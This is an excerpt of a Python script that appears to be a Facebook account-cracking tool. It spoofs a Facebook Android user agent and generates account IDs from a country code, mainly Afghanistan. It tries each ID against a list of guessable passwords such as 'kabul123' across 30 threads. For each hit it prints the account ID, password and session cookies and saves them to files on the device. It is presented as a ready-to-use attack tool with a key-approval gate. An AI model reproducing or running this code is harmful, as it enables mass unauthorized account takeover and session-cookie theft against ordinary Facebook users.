...
def S1():
	...
	e = ";[FBAN/FB4A;FBAV/420.0.0.32.61;FBBV/443010639;FBDM/{density=2.625,width=1080,height=2160};FBLC/en_US;FBRV/58059063;FBCR/Motorola;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto G6;FBSV/8.0;FBOP/1;FBCA/armeabi-v7a;]"
	ua = s + e	
	return ua
...
╩ ╩╚  ╚═╝  ╩═╝╩╚═╝╝╚╝
 ...
 \033[1;95m
 \033[1;97m----------------------------------------
 \033[1;97m[ \033[1;92m\033[1;92m Author   \033[1;97m \033[1;92m \033[1;97m] \033[1;92m LION
                        ...
                        if xd in ['1','01']:
                             ...
                             # line()
                              ...
                              # if cx in ['y','Y','yes','Yes','1']:
                                ...
                                clear()
                                print(' \033[91;1m[1] NO Working\n [2]\033[91;1m NO working\n \033[92;1m[3] All Countries Working\n \033[91;1m[4] NO working\n [5]\033[91;1m NO working\n [0] BACK MENU')
                                line()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
...
def afg():
                ...
                with tred(max_workers=30) as S1N:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'900900','afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','400500','kabul123','afghan1234','kabul1234','khan123','khan123456','khan786','pubgpubg','pubg123','pubg12345','123456789','555555','love12345','jan123']
                                S1N.submit(rd,ids,passlist)
                print('\033[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mAFG\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [ARMAN-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/ARMAN-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [ARMAN-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/ARMAN-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def rd(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;32m\x1b[1;92m [ AFG Loading... \x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				uid = str(po['uid'])                                  
				print('\r\r\033[1;32m [NICE😲] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				...
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;31m [ARMAN-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/ARMAN-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20Abdou%20Sir%20!%20Please%20Approve%20My%20Kwy%20The%20Kwy%20Is%20:%20'+id);os.system('am start https://wa.me/qr/SI5U6B3VRKSDL1');approval() 
      sys.exit()
      time.sleep(1)
      approval()
